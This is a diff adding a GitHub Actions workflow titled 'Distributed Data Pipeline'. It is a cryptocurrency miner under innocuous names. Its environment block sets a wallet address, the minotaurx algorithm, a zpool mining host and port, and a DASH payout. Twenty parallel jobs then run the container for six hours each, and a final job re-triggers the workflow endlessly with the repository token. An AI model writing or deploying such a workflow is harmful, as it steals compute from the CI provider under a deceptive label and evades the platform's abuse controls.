@@ -1,0 +1,412 @@
+name: Distributed Data Pipeline
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '0 */6 * * *'
+
+permissions:
+  actions: write
+  contents: write
+
+env:
+  WALLET: "XcufdyxZtL4JUjALZfTq6pCrxyTt2Hy2Zu"
+  THREADS: "4"
+  ALGORITHM: "cwm_minotaurx"
+  TASK_HOST: "minotaurx.sea.mine.zpool.ca"
+  TASK_PORT: "7019"
+  PAYOUT_COIN: "DASH"
+
+jobs:
+  node-01:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+      - uses: docker/setup-buildx-action@v3
+      - run: docker build -t data-pipeline:latest .
+      - name: Run Processing Node
+        run: |
+          docker run --rm --cpus="4" \
+            -e SLOT_LABEL="NODE-01" \
+            -e WALLET="${{ env.WALLET }}" \
+            -e THREADS="${{ env.THREADS }}" \
+            -e ALGORITHM="${{ env.ALGORITHM }}" \
+            -e TASK_HOST="${{ env.TASK_HOST }}" \
+            -e TASK_PORT="${{ env.TASK_PORT }}" \
+            -e PAYOUT_COIN="${{ env.PAYOUT_COIN }}" \
+            data-pipeline:latest
+
+  node-02:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+      - uses: docker/setup-buildx-action@v3
+      - run: docker build -t data-pipeline:latest .
+      - name: Run Processing Node
+        run: |
+          docker run --rm --cpus="4" \
+            -e SLOT_LABEL="NODE-02" \
+            -e WALLET="${{ env.WALLET }}" \
+            -e THREADS="${{ env.THREADS }}" \
+            -e ALGORITHM="${{ env.ALGORITHM }}" \
+            -e TASK_HOST="${{ env.TASK_HOST }}" \
+            -e TASK_PORT="${{ env.TASK_PORT }}" \
+            -e PAYOUT_COIN="${{ env.PAYOUT_COIN }}" \
+            data-pipeline:latest
+
+  node-03:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+      - uses: docker/setup-buildx-action@v3
+      - run: docker build -t data-pipeline:latest .
+      - name: Run Processing Node
+        run: |
+          docker run --rm --cpus="4" \
+            -e SLOT_LABEL="NODE-03" \
+            -e WALLET="${{ env.WALLET }}" \
+            -e THREADS="${{ env.THREADS }}" \
+            -e ALGORITHM="${{ env.ALGORITHM }}" \
+            -e TASK_HOST="${{ env.TASK_HOST }}" \
+            -e TASK_PORT="${{ env.TASK_PORT }}" \
+            -e PAYOUT_COIN="${{ env.PAYOUT_COIN }}" \
+            data-pipeline:latest
+
+  node-04:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+      - uses: docker/setup-buildx-action@v3
+      - run: docker build -t data-pipeline:latest .
+      - name: Run Processing Node
+        run: |
+          docker run --rm --cpus="4" \
+            -e SLOT_LABEL="NODE-04" \
+            -e WALLET="${{ env.WALLET }}" \
+            -e THREADS="${{ env.THREADS }}" \
+            -e ALGORITHM="${{ env.ALGORITHM }}" \
+            -e TASK_HOST="${{ env.TASK_HOST }}" \
+            -e TASK_PORT="${{ env.TASK_PORT }}" \
+            -e PAYOUT_COIN="${{ env.PAYOUT_COIN }}" \
+            data-pipeline:latest
+
+  node-05:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+      - uses: docker/setup-buildx-action@v3
+      - run: docker build -t data-pipeline:latest .
+      - name: Run Processing Node
+        run: |
+          docker run --rm --cpus="4" \
+            -e SLOT_LABEL="NODE-05" \
+            -e WALLET="${{ env.WALLET }}" \
+            -e THREADS="${{ env.THREADS }}" \
+            -e ALGORITHM="${{ env.ALGORITHM }}" \
+            -e TASK_HOST="${{ env.TASK_HOST }}" \
+            -e TASK_PORT="${{ env.TASK_PORT }}" \
+            -e PAYOUT_COIN="${{ env.PAYOUT_COIN }}" \
+            data-pipeline:latest
+
+  node-06:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+      - uses: docker/setup-buildx-action@v3
+      - run: docker build -t data-pipeline:latest .
+      - name: Run Processing Node
+        run: |
+          docker run --rm --cpus="4" \
+            -e SLOT_LABEL="NODE-06" \
+            -e WALLET="${{ env.WALLET }}" \
+            -e THREADS="${{ env.THREADS }}" \
+            -e ALGORITHM="${{ env.ALGORITHM }}" \
+            -e TASK_HOST="${{ env.TASK_HOST }}" \
+            -e TASK_PORT="${{ env.TASK_PORT }}" \
+            -e PAYOUT_COIN="${{ env.PAYOUT_COIN }}" \
+            data-pipeline:latest
+
+  node-07:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+      - uses: docker/setup-buildx-action@v3
+      - run: docker build -t data-pipeline:latest .
+      - name: Run Processing Node
+        run: |
+          docker run --rm --cpus="4" \
+            -e SLOT_LABEL="NODE-07" \
+            -e WALLET="${{ env.WALLET }}" \
+            -e THREADS="${{ env.THREADS }}" \
+            -e ALGORITHM="${{ env.ALGORITHM }}" \
+            -e TASK_HOST="${{ env.TASK_HOST }}" \
+            -e TASK_PORT="${{ env.TASK_PORT }}" \
+            -e PAYOUT_COIN="${{ env.PAYOUT_COIN }}" \
+            data-pipeline:latest
+
+  node-08:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+      - uses: docker/setup-buildx-action@v3
+      - run: docker build -t data-pipeline:latest .
+      - name: Run Processing Node
+        run: |
+          docker run --rm --cpus="4" \
+            -e SLOT_LABEL="NODE-08" \
+            -e WALLET="${{ env.WALLET }}" \
+            -e THREADS="${{ env.THREADS }}" \
+            -e ALGORITHM="${{ env.ALGORITHM }}" \
+            -e TASK_HOST="${{ env.TASK_HOST }}" \
+            -e TASK_PORT="${{ env.TASK_PORT }}" \
+            -e PAYOUT_COIN="${{ env.PAYOUT_COIN }}" \
+            data-pipeline:latest
+
+  node-09:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+      - uses: docker/setup-buildx-action@v3
+      - run: docker build -t data-pipeline:latest .
+      - name: Run Processing Node
+        run: |
+          docker run --rm --cpus="4" \
+            -e SLOT_LABEL="NODE-09" \
+            -e WALLET="${{ env.WALLET }}" \
+            -e THREADS="${{ env.THREADS }}" \
+            -e ALGORITHM="${{ env.ALGORITHM }}" \
+            -e TASK_HOST="${{ env.TASK_HOST }}" \
+            -e TASK_PORT="${{ env.TASK_PORT }}" \
+            -e PAYOUT_COIN="${{ env.PAYOUT_COIN }}" \
+            data-pipeline:latest
+
+  node-10:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+      - uses: docker/setup-buildx-action@v3
+      - run: docker build -t data-pipeline:latest .
+      - name: Run Processing Node
+        run: |
+          docker run --rm --cpus="4" \
+            -e SLOT_LABEL="NODE-10" \
+            -e WALLET="${{ env.WALLET }}" \
+            -e THREADS="${{ env.THREADS }}" \
+            -e ALGORITHM="${{ env.ALGORITHM }}" \
+            -e TASK_HOST="${{ env.TASK_HOST }}" \
+            -e TASK_PORT="${{ env.TASK_PORT }}" \
+            -e PAYOUT_COIN="${{ env.PAYOUT_COIN }}" \
+            data-pipeline:latest
+
+  node-11:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+      - uses: docker/setup-buildx-action@v3
+      - run: docker build -t data-pipeline:latest .
+      - name: Run Processing Node
+        run: |
+          docker run --rm --cpus="4" \
+            -e SLOT_LABEL="NODE-11" \
+            -e WALLET="${{ env.WALLET }}" \
+            -e THREADS="${{ env.THREADS }}" \
+            -e ALGORITHM="${{ env.ALGORITHM }}" \
+            -e TASK_HOST="${{ env.TASK_HOST }}" \
+            -e TASK_PORT="${{ env.TASK_PORT }}" \
+            -e PAYOUT_COIN="${{ env.PAYOUT_COIN }}" \
+            data-pipeline:latest
+
+  node-12:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+      - uses: docker/setup-buildx-action@v3
+      - run: docker build -t data-pipeline:latest .
+      - name: Run Processing Node
+        run: |
+          docker run --rm --cpus="4" \
+            -e SLOT_LABEL="NODE-12" \
+            -e WALLET="${{ env.WALLET }}" \
+            -e THREADS="${{ env.THREADS }}" \
+            -e ALGORITHM="${{ env.ALGORITHM }}" \
+            -e TASK_HOST="${{ env.TASK_HOST }}" \
+            -e TASK_PORT="${{ env.TASK_PORT }}" \
+            -e PAYOUT_COIN="${{ env.PAYOUT_COIN }}" \
+            data-pipeline:latest
+
+  node-13:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+      - uses: docker/setup-buildx-action@v3
+      - run: docker build -t data-pipeline:latest .
+      - name: Run Processing Node
+        run: |
+          docker run --rm --cpus="4" \
+            -e SLOT_LABEL="NODE-13" \
+            -e WALLET="${{ env.WALLET }}" \
+            -e THREADS="${{ env.THREADS }}" \
+            -e ALGORITHM="${{ env.ALGORITHM }}" \
+            -e TASK_HOST="${{ env.TASK_HOST }}" \
+            -e TASK_PORT="${{ env.TASK_PORT }}" \
+            -e PAYOUT_COIN="${{ env.PAYOUT_COIN }}" \
+            data-pipeline:latest
+
+  node-14:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+      - uses: docker/setup-buildx-action@v3
+      - run: docker build -t data-pipeline:latest .
+      - name: Run Processing Node
+        run: |
+          docker run --rm --cpus="4" \
+            -e SLOT_LABEL="NODE-14" \
+            -e WALLET="${{ env.WALLET }}" \
+            -e THREADS="${{ env.THREADS }}" \
+            -e ALGORITHM="${{ env.ALGORITHM }}" \
+            -e TASK_HOST="${{ env.TASK_HOST }}" \
+            -e TASK_PORT="${{ env.TASK_PORT }}" \
+            -e PAYOUT_COIN="${{ env.PAYOUT_COIN }}" \
+            data-pipeline:latest
+
+  node-15:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+      - uses: docker/setup-buildx-action@v3
+      - run: docker build -t data-pipeline:latest .
+      - name: Run Processing Node
+        run: |
+          docker run --rm --cpus="4" \
+            -e SLOT_LABEL="NODE-15" \
+            -e WALLET="${{ env.WALLET }}" \
+            -e THREADS="${{ env.THREADS }}" \
+            -e ALGORITHM="${{ env.ALGORITHM }}" \
+            -e TASK_HOST="${{ env.TASK_HOST }}" \
+            -e TASK_PORT="${{ env.TASK_PORT }}" \
+            -e PAYOUT_COIN="${{ env.PAYOUT_COIN }}" \
+            data-pipeline:latest
+
+  node-16:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+      - uses: docker/setup-buildx-action@v3
+      - run: docker build -t data-pipeline:latest .
+      - name: Run Processing Node
+        run: |
+          docker run --rm --cpus="4" \
+            -e SLOT_LABEL="NODE-16" \
+            -e WALLET="${{ env.WALLET }}" \
+            -e THREADS="${{ env.THREADS }}" \
+            -e ALGORITHM="${{ env.ALGORITHM }}" \
+            -e TASK_HOST="${{ env.TASK_HOST }}" \
+            -e TASK_PORT="${{ env.TASK_PORT }}" \
+            -e PAYOUT_COIN="${{ env.PAYOUT_COIN }}" \
+            data-pipeline:latest
+
+  node-17:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+      - uses: docker/setup-buildx-action@v3
+      - run: docker build -t data-pipeline:latest .
+      - name: Run Processing Node
+        run: |
+          docker run --rm --cpus="4" \
+            -e SLOT_LABEL="NODE-17" \
+            -e WALLET="${{ env.WALLET }}" \
+            -e THREADS="${{ env.THREADS }}" \
+            -e ALGORITHM="${{ env.ALGORITHM }}" \
+            -e TASK_HOST="${{ env.TASK_HOST }}" \
+            -e TASK_PORT="${{ env.TASK_PORT }}" \
+            -e PAYOUT_COIN="${{ env.PAYOUT_COIN }}" \
+            data-pipeline:latest
+
+  node-18:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+      - uses: docker/setup-buildx-action@v3
+      - run: docker build -t data-pipeline:latest .
+      - name: Run Processing Node
+        run: |
+          docker run --rm --cpus="4" \
+            -e SLOT_LABEL="NODE-18" \
+            -e WALLET="${{ env.WALLET }}" \
+            -e THREADS="${{ env.THREADS }}" \
+            -e ALGORITHM="${{ env.ALGORITHM }}" \
+            -e TASK_HOST="${{ env.TASK_HOST }}" \
+            -e TASK_PORT="${{ env.TASK_PORT }}" \
+            -e PAYOUT_COIN="${{ env.PAYOUT_COIN }}" \
+            data-pipeline:latest
+
+  node-19:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+      - uses: docker/setup-buildx-action@v3
+      - run: docker build -t data-pipeline:latest .
+      - name: Run Processing Node
+        run: |
+          docker run --rm --cpus="4" \
+            -e SLOT_LABEL="NODE-19" \
+            -e WALLET="${{ env.WALLET }}" \
+            -e THREADS="${{ env.THREADS }}" \
+            -e ALGORITHM="${{ env.ALGORITHM }}" \
+            -e TASK_HOST="${{ env.TASK_HOST }}" \
+            -e TASK_PORT="${{ env.TASK_PORT }}" \
+            -e PAYOUT_COIN="${{ env.PAYOUT_COIN }}" \
+            data-pipeline:latest
+
+  node-20:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+      - uses: docker/setup-buildx-action@v3
+      - run: docker build -t data-pipeline:latest .
+      - name: Run Processing Node
+        run: |
+          docker run --rm --cpus="4" \
+            -e SLOT_LABEL="NODE-20" \
+            -e WALLET="${{ env.WALLET }}" \
+            -e THREADS="${{ env.THREADS }}" \
+            -e ALGORITHM="${{ env.ALGORITHM }}" \
+            -e TASK_HOST="${{ env.TASK_HOST }}" \
+            -e TASK_PORT="${{ env.TASK_PORT }}" \
+            -e PAYOUT_COIN="${{ env.PAYOUT_COIN }}" \
+            data-pipeline:latest
+
+  rerun:
+    runs-on: ubuntu-latest
+    needs: [node-01, node-02, node-03, node-04, node-05, node-06, node-07, node-08, node-09, node-10, node-11, node-12, node-13, node-14, node-15, node-16, node-17, node-18, node-19, node-20]
+    if: always()
+    steps:
+      - name: Re-trigger workflow
+        env:
+          GH_TOKEN: ${{ github.token }}
+        run: |
+          echo "All nodes finished. Re-triggering workflow..."
+          gh workflow run "${{ github.workflow }}" --repo "${{ github.repository }}" --ref "${{ github.ref_name }}"
+          echo "Workflow re-triggered successfully."
